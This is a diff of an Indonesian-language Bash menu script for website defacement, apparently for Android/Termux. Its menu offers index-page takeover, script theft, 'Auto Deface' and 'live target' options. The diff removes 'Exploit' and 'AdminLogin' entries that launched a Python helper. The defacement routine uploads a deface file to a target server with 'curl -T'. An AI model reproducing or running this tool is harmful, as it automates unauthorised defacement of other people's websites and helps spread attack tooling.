@@ -21,8 +21,7 @@ echo $cyan" ["$white"NOTE : simpan script di memory internal di luar folder"$cya
 echo $purple"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
 echo $red"	~"$cyan"{"$white"A"$cyan"}"$green".Tebas Index"$cyan"   {"$white"Q"$cyan"}"$green"Quit "
 echo $red"	~"$cyan"{"$white"B"$cyan"}"$green".Colong Script"$cyan" {"$white"I"$cyan"}"$green"Info "
-echo $red"	~"$cyan"{"$white"C"$cyan"}"$green".Exploit"$cyan
-echo $red"	~"$cyan"{"$white"D"$cyan"}"$green".AdminLogin"$cyan
+echo $red"	~"$cyan"{"$white"C"$cyan"}"$green".Auto Deface"$cyan
 echo $purple"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
 echo $red"	~"$cyan"{"$white"T"$cyan"}"$white".TUTORIAL & LIVE TARGET"$cyan
 echo $purple"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
@@ -65,7 +64,7 @@ fi
 if [ $apaan = "C" ] || [ $apaan = "c" ]
 then
 echo $yellow
-figlet -f future "Auto Deface"
+figlet -f future "Auto Deface 20"
 
 echo "### ctrl + c to quit ###"
 echo "Masukan Script !!!!"
@@ -173,12 +172,6 @@ curl -T /storage/emulated/0/$script $target20
 echo $cyan"["$green"+"$cyan"]"$red"$target20/$script"
 echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
 read -p "[B/Q] : " back
-fi
-
-if [ $apaan = "D" ] || [ $apaan = "d" ]
-then
-python2 zrd.py
-exit
 fi
 
 if [ $apaan = "I" ] || [ $apaan = "i" ]
